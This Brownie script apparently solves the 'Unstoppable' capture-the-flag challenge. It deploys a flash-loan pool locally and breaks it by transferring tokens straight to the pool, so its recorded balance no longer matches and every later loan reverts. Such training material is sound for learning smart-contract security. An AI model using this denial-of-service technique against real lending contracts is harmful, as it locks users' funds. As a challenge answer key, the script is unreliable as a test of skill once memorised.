from brownie import *
from brownie.exceptions import VirtualMachineError

def main():
    deployer = a[0]
    attacker = a[1]
    someUser = a[2]

    TOKENS_IN_POOL = 1000000
    INITIAL_ATTACKER_TOKEN_BALANCE = 100

    token = DamnValuableToken.deploy({'from': deployer})
    pool = UnstoppableLender.deploy(token, {'from': deployer})

    token.approve(pool, TOKENS_IN_POOL, {'from': deployer})
    pool.depositTokens(TOKENS_IN_POOL, {'from': deployer})

    token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE, {'from': deployer})

    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert token.balanceOf(attacker) == INITIAL_ATTACKER_TOKEN_BALANCE

    receiver = ReceiverUnstoppable.deploy(pool, {'from': someUser})
    receiver.executeFlashLoan(10, {'from': someUser});

    # Exploit code here
    token.transfer(pool, INITIAL_ATTACKER_TOKEN_BALANCE, {'from': attacker})
    print(f'Pool token balance: {token.balanceOf(pool)}')
    print(f'Pool poolBalance variable: {pool.poolBalance()}')

    # Success condition - no longer possible to execute flash loans
    try:
        receiver.executeFlashLoan(10, {'from': someUser});
        print('Challenge failed.')
    except VirtualMachineError:
        assert history[-1].status.value == 0 # Reverted
        print('Challenge successfully passed.')

